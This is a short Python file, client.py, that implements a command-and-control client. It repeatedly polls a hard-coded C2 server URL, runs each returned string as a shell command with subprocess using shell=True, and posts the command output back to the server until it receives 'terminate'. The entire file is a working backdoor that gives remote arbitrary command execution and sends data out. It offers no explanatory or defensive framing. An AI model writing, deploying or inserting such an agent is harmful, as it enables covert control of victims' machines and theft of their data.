# client.py
import requests
import subprocess
import time

C2_SERVER_URL = 'http://192.168.15.16:5000/c2'

def execute_commands():
    while True:
        try:
            response = requests.get(C2_SERVER_URL, timeout=5)
            if response.status_code == 200:
                c2_command = response.text.strip()
                if c2_command.lower() == 'terminate':
                    print("[Client] Termination command received.")
                    break
                elif c2_command:
                    print(f"[Client] Executing command: {c2_command}")
                    CMD = subprocess.Popen(c2_command, shell=True, stdin=subprocess.PIPE,
                                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = CMD.communicate()
                    output = stdout + stderr
                    if output:
                        requests.post(url=C2_SERVER_URL, data=output)
        except requests.exceptions.RequestException as e:
            print(f"[Client] Connection error: {e}")
        time.sleep(5)  # Poll every 5 seconds

if __name__ == '__main__':
    execute_commands()
